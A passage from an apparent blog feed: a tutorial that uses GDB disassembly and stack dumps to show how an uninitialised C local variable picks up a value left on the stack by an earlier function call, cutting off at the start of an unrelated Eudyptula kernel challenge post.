</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x0000000000001178</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	    <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Store 0x37(55) in [rbp-0x4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x000000000000117c</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x37</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Print this value with a specific message
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x0000000000001183</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001186</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000118a</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000118d</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xe80</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x2014</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001194</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001197</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000119c</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1040</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Epilogue: set this value as return value and leave
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011a1</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011a4</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;:</span>	<span class="n">leave</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011a5</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">ret</span>
</span></span><span class="line"><span class="cl"><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></span></code></pre></div><p>The above function, when called, will create another stack frame just after the main function&rsquo;s stack frame&hellip; and will create it&rsquo;s local variables in that region.</p>
<p>This function will print the value of the local variable and then return back to the main function. This action will remove the stack frame created by resetting the stack pointer and base pointer register values&hellip; BUT the actual values stored in memory location is still not overwritten by anything. So technically, the values are still present there and can be accessed if the memory location can be pointed to.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">disas</span> <span class="n">func2</span>
</span></span><span class="line"><span class="cl"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">func2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x0000000000001149</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	    <span class="n">push</span>   <span class="n">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000114a</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Create memory for the variable -- 4(var2) + 12(padding) = 16 (0x10)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x000000000000114d</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	    <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Print the value with a specific message
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x0000000000001151</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001154</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001158</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000115b</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xea2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x2004</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001162</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001165</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x000000000000116a</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1040</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Epilogue: set this value as return value and leave
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x000000000000116f</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001172</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;:</span>	<span class="n">leave</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001173</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span>	<span class="n">ret</span>
</span></span><span class="line"><span class="cl"><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></span></code></pre></div><p>After the <code>func1</code> has returned, it&rsquo;s time for <code>func2</code> to create it&rsquo;s own stack frame and it&rsquo;s own local variables.</p>
<p>Coincidently, the memory location used by <code>func2</code> is exactly the same location that was used by <code>func1</code> earlier. And on top of that, both functions have <code>int</code> type variables which means that the memory location used by <code>var1</code> in <code>func1</code> will be used by <code>var2</code> in <code>func2</code>.</p>
<p>Stack frame for both functions will <em>kind of</em> overlap each other. That should explain why we we&rsquo;re getting the same results and same memory locations in the program output earlier.</p>
<p>This theory should be enough to understand what&rsquo;s going on&hellip;. But practical is more fun. Accept it!!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/hu0tQXRqT06YOFvd8D/giphy.gif#center" alt=""  />
</p>
<p>I&rsquo;m going to place some breakpoints in the code and check the status of the stack on each hit. For me, such interesting points are where new variables or function&rsquo;s stack frame will be created. This will help me to analyze the change in stack as we go forward.</p>
<p>(<em><strong>NOTE</strong>: Sometimes I over-use breakpoints. Don&rsquo;t judge me :|</em> )</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">info</span> <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="n">Num</span>     <span class="n">Type</span>           <span class="n">Disp</span> <span class="n">Enb</span> <span class="n">Address</span>            <span class="n">What</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551a6 &lt;main+0&gt;:	    push   rbp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551a6</span> <span class="n">in</span> <span class="n">main</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551aa &lt;main+4&gt;:	    sub    rsp,0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551aa</span> <span class="n">in</span> <span class="n">main</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551b3 &lt;main+13&gt;:	call   0x555555555174 &lt;func1&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551b3</span> <span class="n">in</span> <span class="n">main</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">17</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551c0 &lt;main+26&gt;:	call   0x555555555149 &lt;func2&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551c0</span> <span class="n">in</span> <span class="n">main</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">18</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551f5 &lt;main+79&gt;:	leave
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551f5</span> <span class="n">in</span> <span class="n">main</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">26</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555555174 &lt;func1&gt;:	    push   rbp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">6</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x0000555555555174</span> <span class="n">in</span> <span class="n">func1</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">9</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555555178 &lt;func1+4&gt;:	sub    rsp,0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">7</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x0000555555555178</span> <span class="n">in</span> <span class="n">func1</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">9</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x5555555551a5 &lt;func1+49&gt;:	ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">8</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x00005555555551a5</span> <span class="n">in</span> <span class="n">func1</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">13</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555555149 &lt;func2&gt;:	    push   rbp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">9</span>       <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x0000555555555149</span> <span class="n">in</span> <span class="n">func2</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x55555555514d &lt;func2+4&gt;:	sub    rsp,0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">10</span>      <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x000055555555514d</span> <span class="n">in</span> <span class="n">func2</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555555173 &lt;func2+42&gt;:	ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">11</span>      <span class="n">breakpoint</span>     <span class="n">keep</span> <span class="n">y</span>   <span class="mh">0x0000555555555173</span> <span class="n">in</span> <span class="n">func2</span> <span class="n">at</span> <span class="n">func_calls</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">7</span>
</span></span></code></pre></div><p>I&rsquo;ve set up 11 break points here which will help me check the change in stack during the execution of the program.</p>
<p>After running the program in debugger, it&rsquo;ll stop at the first break point which is just before the point where <code>main</code> function&rsquo;s stack frame will begin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg <span class="nv">$rsp</span>
</span></span><span class="line"><span class="cl">0x7fffffffe218:	0x00007ffff7de0790	0x00007fffffffe310
</span></span><span class="line"><span class="cl">0x7fffffffe228:	0x00005555555551a6	0x0000000155554040
</span></span><span class="line"><span class="cl">0x7fffffffe238:	0x00007fffffffe328	0x00007fffffffe328
</span></span><span class="line"><span class="cl">0x7fffffffe248:	0x86b5da47f7ba01f3	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffe258:	0x00007fffffffe338	0x0000555555557dd8
</span></span></code></pre></div><p>Theoretically, we know if we step over another instruction, value from <code>rbp</code> will be stored in the stack. So let&rsquo;s check the value of <code>rbp</code> right now and then monitor the stack (after stepping over) to see if it is the same value we are expecting it to be.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// Check the base pointer before stepping over instruction
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; p <span class="nv">$rbp</span>
</span></span><span class="line"><span class="cl"><span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>void *<span class="o">)</span> 0x1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Check the next instruction to be executed
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; x <span class="nv">$rip</span>
</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0x5555555551a6 &lt;main&gt;:	push   rbp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Step over an instruction
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; ni
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Monitor stack
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg <span class="nv">$rsp</span>
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span><span class="line"><span class="cl">0x7fffffffe240:	0x00007fffffffe328	0x8f2aa2d53bd1951c
</span></span><span class="line"><span class="cl">0x7fffffffe250:	0x0000000000000000	0x00007fffffffe338
</span></span></code></pre></div><p>Now our stack has a new item in it, that is <code>rbp</code> value. If you notice, previously the top of the stack was at <code>0x7fffffffe218</code>, but after adding one item the top of stack is <code>0x7fffffffe210</code>. It decreased, which indicates that stack grows downwards; towards lower memory addresses.</p>
<p>The stack does not change up until the breakpoint 2 on <code>0x5555555551aa &lt;main+4&gt;:	    sub    rsp,0x10</code>&hellip; But on stepping another instruction, we can see a new space of <strong>16 bytes</strong> in the stack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00007ffff7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span><span class="line"><span class="cl">0x7fffffffe240:	0x00007fffffffe328	0x8f2aa2d53bd1951c
</span></span></code></pre></div><p>Before this, the stack pointer was on <code>0x7fffffffe210</code>, now the stack pointer is on <code>0x7fffffffe200</code>&hellip; so <code>0x7fffffffe210 - 0x7fffffffe200 = 0x10 (16)</code>. Simple maths!!</p>
<p>We just moved the stack pointer down to create space required, no cleaning was done&hellip; hence the stack is already filled with some garbage value that resided in the memory long before the stack occupied this new memory region.</p>
<p>Now let&rsquo;s call the function <code>func1</code> and see what that function call will add to the stack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1f8:	0x00005555555551b8	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffe208:	0x00007ffff7ffdab0	0x0000000000000001
</span></span><span class="line"><span class="cl">0x7fffffffe218:	0x00007ffff7de0790	0x00007fffffffe310
</span></span><span class="line"><span class="cl">0x7fffffffe228:	0x00005555555551a6	0x0000000155554040
</span></span><span class="line"><span class="cl">0x7fffffffe238:	0x00007fffffffe328	0x00007fffffffe328
</span></span></code></pre></div><p>Just after making the function call and before executing the first instruction of the <code>func1</code>, we have a new value in the stack. This new value is the return address for the main function, which will be used to continue execution after the func1 call is finished.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/i 0x00005555555551b8
</span></span><span class="line"><span class="cl">   0x5555555551b8 &lt;main+18&gt;:	mov    DWORD PTR [rbp-0x4],eax
</span></span></code></pre></div><p>(Note: if this value is somehow overwritten, we can make our function to return to another function or instruction. This is something which comes under a technique called Return Oriented Programming aka ROP.)</p>
<p>After the first instruction of the <code>func1</code> function, that is pushing the <code>rbp</code> on the stack, we can see an updated stack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1f0:	0x00007fffffffe210	0x00005555555551b8
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00007ffff7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span></code></pre></div><p>This points to the place where the <code>main</code> function&rsquo;s <code>base pointer</code> is. Think this as a chain like connection which links to the next stop.</p>
<p>Now after creating some space in this new stack frame for <code>var1</code>&hellip;. Stack looks like this. (<em>Notice that the stack keeps on growing down, towards low memory regions.</em>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1e0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffe1f0:	0x00007fffffffe210	0x00005555555551b8
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00007ffff7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span></code></pre></div><p>The <code>leave</code> instruction does a lot of the work. It copies the <code>rbp</code> to <code>rsp</code> and then restores the old <code>rbp</code> from the stack again.</p>
<p>This will move the base pointer back to <code>0x00007fffffffe210</code> and the stack pointer to <code>0x00007fffffffe1f8</code>.</p>
<p>This instruction basically releases a stack frame set up by a function. That means now our new stack will look something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1f8:	0x00005555555551b8	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffe208:	0x00007ffff7ffdab0	0x0000000000000001
</span></span><span class="line"><span class="cl">0x7fffffffe218:	0x00007ffff7de0790	0x00007fffffffe310
</span></span><span class="line"><span class="cl">0x7fffffffe228:	0x00005555555551a6	0x0000000155554040
</span></span><span class="line"><span class="cl">0x7fffffffe238:	0x00007fffffffe328	0x00007fffffffe328
</span></span></code></pre></div><p>The next <code>ret</code> statement will take off the top of the value from stack and move the instruction control to that memory location&hellip; that is, set the <code>rip</code> value to that memory location. This means that the next instruction to be executed will be &lt;main+18&gt; which stores the <code>eax</code> (return value from the previous function call) into <code>[rbp-0x4]</code> location on stack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/i 0x00005555555551b8
</span></span><span class="line"><span class="cl">=&gt; 0x5555555551b8 &lt;main+18&gt;:	mov    DWORD PTR [rbp-0x4],eax
</span></span></code></pre></div><p>So when <code>func1</code> returns back, our stack looks something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00007ffff7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span><span class="line"><span class="cl">0x7fffffffe240:	0x00007fffffffe328	0x42033bae0bc1441d
</span></span></code></pre></div><p>Now for the next function <code>func2</code>, our stack is like this, just before the <code>sub    rsp,0x10</code> instruction. This instruction will create enough memory for the variables to be.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1f0:	0x00007fffffffe210	0x00005555555551c5
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00000037f7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span></code></pre></div><p>Once the space in stack memory is created, the stack looks like this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe1e0:	0x0000000000000000	0x0000003700000000
</span></span><span class="line"><span class="cl">0x7fffffffe1f0:	0x00007fffffffe210	0x00005555555551c5
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x00000037f7ffdab0
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span></code></pre></div><p>If you notice, these are the same memory locations which were used by <code>func1</code> to store <code>0x37</code> (<code>mov    DWORD PTR [rbp-0x4],0x37</code>)&hellip;. and since the stack is not cleaned properly, the value from that function is still in the place it was left to be picked by our variable <code>var2</code>.</p>
<p>This can be checked with <code>x/w ($rbp-0x4)</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/w ($rbp-0x4)
</span></span><span class="line"><span class="cl">0x7fffffffe1ec:	0x00000037
</span></span></code></pre></div><p>So the value is just as it was left by <code>func1</code>&hellip; :|</p>
<p>Now after returning back to <code>main</code> function, the stack looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/10xg $rsp
</span></span><span class="line"><span class="cl">0x7fffffffe200:	0x0000000000000000	0x0000003700000037
</span></span><span class="line"><span class="cl">0x7fffffffe210:	0x0000000000000001	0x00007ffff7de0790
</span></span><span class="line"><span class="cl">0x7fffffffe220:	0x00007fffffffe310	0x00005555555551a6
</span></span><span class="line"><span class="cl">0x7fffffffe230:	0x0000000155554040	0x00007fffffffe328
</span></span><span class="line"><span class="cl">0x7fffffffe240:	0x00007fffffffe328	0x42033bae0bc1441d
</span></span></code></pre></div><p>And both <code>v1</code> and <code>v2</code>, are same values and were picked from the same memory locations when in their respective function frames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; x/w $rbp-0x4
</span></span><span class="line"><span class="cl">0x7fffffffe20c:	0x00000037
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; x/w $rbp-0x8
</span></span><span class="line"><span class="cl">0x7fffffffe208:	0x00000037
</span></span></code></pre></div><p><img loading="lazy" src="https://media.giphy.com/media/3ohzdNuQy40h2dUCGI/giphy.gif#center" alt=""  />
</p>
<p>This explains the <em>somewhat</em> unusual behaviour of the program. There is nothing special about this, its just the way the stack memory works and a well crafted example presented to you.</p>
<p>In next article, I&rsquo;ll try to cover stack overflows&hellip; which is a cool technique to insert the data in a variable which will overflow and overwrite the data for another variable. Try to think around this, if you may.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task 7</title>
      <link>https://ayedaemon.github.io/post/2023/05/eudyptula-task-7/</link>
      <pubDate>Mon, 01 May 2023 02:32:12 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2023/05/eudyptula-task-7/</guid>
      <description>Task 7 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">This</span> <span class="n">is</span> <span class="n">Task</span> <span class="mi">07</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Eudyptula</span> <span class="n">Challenge</span>
</span></span><span class="line"><span class="cl"><span class="o">------------------------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Great</span> <span class="n">work</span> <span class="n">with</span> <span class="n">that</span> <span class="n">misc</span> <span class="n">device</span> <span class="n">driver</span><span class="o">.</span>  <span class="n">Isn</span><span class="s1">&#39;t that a nice and simple</span>
